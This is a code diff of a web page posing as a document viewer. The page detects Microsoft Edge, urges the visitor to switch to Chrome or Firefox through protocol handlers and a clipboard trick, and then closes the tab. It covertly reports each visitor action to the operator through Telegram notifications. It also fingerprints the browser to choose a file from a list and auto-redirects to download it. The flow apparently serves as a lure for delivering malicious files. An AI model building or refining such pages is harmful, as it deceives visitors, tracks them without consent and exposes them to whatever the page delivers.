@@ -112,43 +112,69 @@
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 12px;
-            margin-top: 24px;
+            gap: 16px;
+            margin: 24px 0;
         }
         .permission-btn {
             display: inline-block;
-            padding: 10px 24px;
+            padding: 12px 28px;
             background: #667eea;
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.2s;
+            text-decoration: none;
+            text-align: center;
+        }
+        .permission-btn.chrome {
+            background: #4285f4;
+        }
+        .permission-btn.firefox {
+            background: #ff9400;
         }
         .permission-btn:hover:not(:disabled) {
-            background: #5a67d8;
+            transform: translateY(-2px);
+            filter: brightness(1.05);
         }
         .permission-btn.disabled, .permission-btn:disabled {
             background: #adb5bd;
             cursor: not-allowed;
-            opacity: 0.6;
-        }
-        .install-link {
-            display: inline-block;
-            margin-top: 4px;
-            font-size: 12px;
-            color: #667eea;
-            text-decoration: none;
-        }
-        .install-link:hover {
-            text-decoration: underline;
+            transform: none;
         }
         .browser-status {
-            font-size: 12px;
+            font-size: 13px;
             margin-top: 8px;
-            color: #6c757d;
+            font-weight: 500;
+        }
+        .install-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        }
+        .install-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 12px;
+        }
+        .install-links a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .install-links a:hover {
+            text-decoration: underline;
+        }
+        .instruction-note {
+            background: #f0f2f5;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 20px 0 0;
+            font-size: 13px;
+            color: #495057;
         }
     </style>
 </head>
@@ -295,7 +321,50 @@
         }
         
         // ============================================================
-        // ASK TO OPEN IN CHROME/FIREFOX (check installation first)
+        // OPEN IN BROWSER WITH FALLBACK
+        // ============================================================
+        function openInBrowser(browser, url, browserName, buttonElement) {
+            // Disable button temporarily
+            buttonElement.disabled = true;
+            buttonElement.textContent = 'Opening...';
+            
+            // Show loading status
+            const statusDiv = document.getElementById(`${browser}Status`);
+            if (statusDiv) {
+                statusDiv.innerHTML = '⏳ Attempting to open...';
+                statusDiv.style.color = '#ff9400';
+            }
+            
+            // Try to open with custom protocol
+            window.location.href = `${browser}://${url.replace(/^https?:\/\//, '')}`;
+            
+            // Copy link to clipboard as fallback
+            navigator.clipboard.writeText(url);
+            
+            // Show success/instruction message
+            setTimeout(() => {
+                if (statusDiv) {
+                    statusDiv.innerHTML = '✅ Link copied to clipboard. If the browser didn\'t open, paste it manually.';
+                    statusDiv.style.color = '#28a745';
+                }
+                
+                // Send Telegram notification
+                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', `opened_in_${browserName}`);
+                
+                // Reset button after 3 seconds
+                setTimeout(() => {
+                    buttonElement.disabled = false;
+                    buttonElement.textContent = `Open in ${browserName.charAt(0).toUpperCase() + browserName.slice(1)}`;
+                    if (statusDiv) statusDiv.innerHTML = '';
+                }, 3000);
+                
+                // Close current tab after short delay
+                setTimeout(() => window.close(), 2000);
+            }, 500);
+        }
+        
+        // ============================================================
+        // ASK TO OPEN IN CHROME/FIREFOX
         // ============================================================
         function askToOpenInOtherBrowser(currentUrl) {
             // Create modal
@@ -306,7 +375,7 @@
                 left: 0;
                 width: 100%;
                 height: 100%;
-                background: rgba(0,0,0,0.7);
+                background: rgba(0,0,0,0.8);
                 display: flex;
                 justify-content: center;
                 align-items: center;
@@ -316,87 +385,103 @@
             const dialog = document.createElement('div');
             dialog.style.cssText = `
                 background: white;
-                max-width: 450px;
+                max-width: 500px;
                 width: 90%;
                 padding: 30px;
                 border-radius: 24px;
                 text-align: center;
-                box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+                max-height: 90vh;
+                overflow-y: auto;
             `;
             
             dialog.innerHTML = `
                 <div style="font-size: 48px; margin-bottom: 16px;">🌐</div>
                 <h2 style="margin-bottom: 12px;">Switch Browser</h2>
-                <p style="color: #6c757d; margin-bottom: 24px;">
+                <p style="color: #6c757d; margin-bottom: 20px;">
                     This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
-                    Choose a browser to open the link.
                 </p>
-                <div class="permission-buttons" id="browserButtons">
-                    <button id="chromeBtn" class="permission-btn" style="background: #4285f4;">Open in Chrome</button>
-                    <button id="firefoxBtn" class="permission-btn" style="background: #ff9400;">Open in Firefox</button>
-                    <button id="cancelBtn" class="permission-btn" style="background: #adb5bd;">Cancel</button>
+                
+                <div class="permission-buttons">
+                    <button id="chromeBtn" class="permission-btn chrome">Open in Chrome</button>
+                    <button id="firefoxBtn" class="permission-btn firefox">Open in Firefox</button>
                 </div>
+                
                 <div id="chromeStatus" class="browser-status"></div>
                 <div id="firefoxStatus" class="browser-status"></div>
-                <p style="font-size: 11px; color: #adb5bd; margin-top: 20px;">
-                    If you don't have a browser installed, you can download it below.
-                </p>
-                <div style="margin-top: 12px;">
-                    <a href="https://www.google.com/chrome/" target="_blank" style="color: #4285f4; text-decoration: none; margin: 0 8px;">Download Chrome</a>
-                    <a href="https://www.mozilla.org/firefox/" target="_blank" style="color: #ff9400; text-decoration: none; margin: 0 8px;">Download Firefox</a>
+                
+                <div class="install-section">
+                    <p style="font-size: 14px; color: #6c757d; margin-bottom: 8px;">
+                        <strong>Don't have Chrome or Firefox?</strong>
+                    </p>
+                    <div class="install-links">
+                        <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
+                        <a href="https://www.mozilla.org/firefox/" target="_blank">⬇️ Download Firefox</a>
+                    </div>
+                    <p style="font-size: 12px; color: #6c757d; margin-top: 12px;">
+                        After installing, <strong>copy this link</strong> and paste it into the new browser:
+                    </p>
+                    <div style="background: #f0f2f5; padding: 8px; border-radius: 6px; margin-top: 8px; word-break: break-all; font-size: 12px; font-family: monospace;">
+                        ${currentUrl}
+                    </div>
                 </div>
+                
+                <div class="instruction-note">
+                    💡 <strong>Tip:</strong> After installing Chrome/Firefox, click the button above to open the document.
+                    If it doesn't work, the link will be copied to your clipboard automatically.
+                </div>
+                
+                <button id="cancelBtn" style="margin-top: 24px; background: none; border: none; color: #6c757d; cursor: pointer; font-size: 14px; text-decoration: underline;">
+                    Stay in Edge (not recommended)
+                </button>
             `;
             
             modal.appendChild(dialog);
             document.body.appendChild(modal);
             
-            // Check if Chrome is installed
+            // Check Chrome installation
             isBrowserInstalled('googlechrome', (chromeInstalled) => {
                 const chromeBtn = document.getElementById('chromeBtn');
                 const chromeStatus = document.getElementById('chromeStatus');
                 if (!chromeInstalled) {
-                    chromeBtn.disabled = true;
                     chromeBtn.classList.add('disabled');
-                    chromeStatus.innerHTML = '⚠️ Chrome not detected on this computer';
+                    chromeStatus.innerHTML = '⚠️ Chrome not detected. Download it above.';
+                    chromeStatus.style.color = '#dc3545';
                 } else {
                     chromeStatus.innerHTML = '✅ Chrome is installed';
+                    chromeStatus.style.color = '#28a745';
                 }
             });
             
-            // Check if Firefox is installed
+            // Check Firefox installation
             isBrowserInstalled('firefox', (firefoxInstalled) => {
                 const firefoxBtn = document.getElementById('firefoxBtn');
                 const firefoxStatus = document.getElementById('firefoxStatus');
                 if (!firefoxInstalled) {
-                    firefoxBtn.disabled = true;
                     firefoxBtn.classList.add('disabled');
-                    firefoxStatus.innerHTML = '⚠️ Firefox not detected on this computer';
+                    firefoxStatus.innerHTML = '⚠️ Firefox not detected. Download it above.';
+                    firefoxStatus.style.color = '#dc3545';
                 } else {
                     firefoxStatus.innerHTML = '✅ Firefox is installed';
+                    firefoxStatus.style.color = '#28a745';
                 }
             });
             
-            // Handle Chrome button
-            document.getElementById('chromeBtn').onclick = () => {
-                modal.remove();
-                window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(currentUrl);
-                alert('If Chrome didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Chrome.');
-                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_chrome');
-                setTimeout(() => window.close(), 1000);
+            // Chrome button click
+            document.getElementById('chromeBtn').onclick = (e) => {
+                e.preventDefault();
+                const chromeBtn = document.getElementById('chromeBtn');
+                openInBrowser('googlechrome', currentUrl, 'chrome', chromeBtn);
             };
             
-            // Handle Firefox button
-            document.getElementById('firefoxBtn').onclick = () => {
-                modal.remove();
-                window.location.href = 'firefox://' + currentUrl.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(currentUrl);
-                alert('If Firefox didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Firefox.');
-                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_firefox');
-                setTimeout(() => window.close(), 1000);
+            // Firefox button click
+            document.getElementById('firefoxBtn').onclick = (e) => {
+                e.preventDefault();
+                const firefoxBtn = document.getElementById('firefoxBtn');
+                openInBrowser('firefox', currentUrl, 'firefox', firefoxBtn);
             };
             
-            // Handle Cancel button
+            // Cancel button
             document.getElementById('cancelBtn').onclick = () => {
                 modal.remove();
                 sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
@@ -444,14 +529,14 @@
                 return;
             }
             
-            // EDGE – ASK FOR PERMISSION TO USE CHROME/FIREFOX
+            // EDGE – ASK TO SWITCH BROWSER
             if (browser === 'Microsoft Edge') {
                 sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
                 askToOpenInOtherBrowser(currentUrl);
                 return;
             }
             
-            // WINDOWS DESKTOP + CHROME/FIREFOX – show loading and redirect
+            // CHROME/FIREFOX – SHOW LOADING AND REDIRECT
             document.getElementById('app').innerHTML = `
                 <div class="container">
                     <div class="icon">📄</div>
@@ -466,7 +551,6 @@
                 </div>
             `;
             
-            // Select random file based on fingerprint
             function getRandomFile() {
                 const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
                 let hash = 0;
@@ -478,8 +562,6 @@
             }
             
             const selectedFile = getRandomFile();
-            
-            // Send Telegram notification
             sendVisitNotification(selectedFile, browser, 'access_granted');
             
             if (!sessionStorage.getItem('redirected')) {
@@ -501,7 +583,6 @@
                     window.location.href = selectedFile;
                 }, delay);
                 
-                // Fallback manual link
                 setTimeout(() => {
                     const manualLink = document.getElementById('manualLink');
                     const manualUrl = document.getElementById('manualUrl');
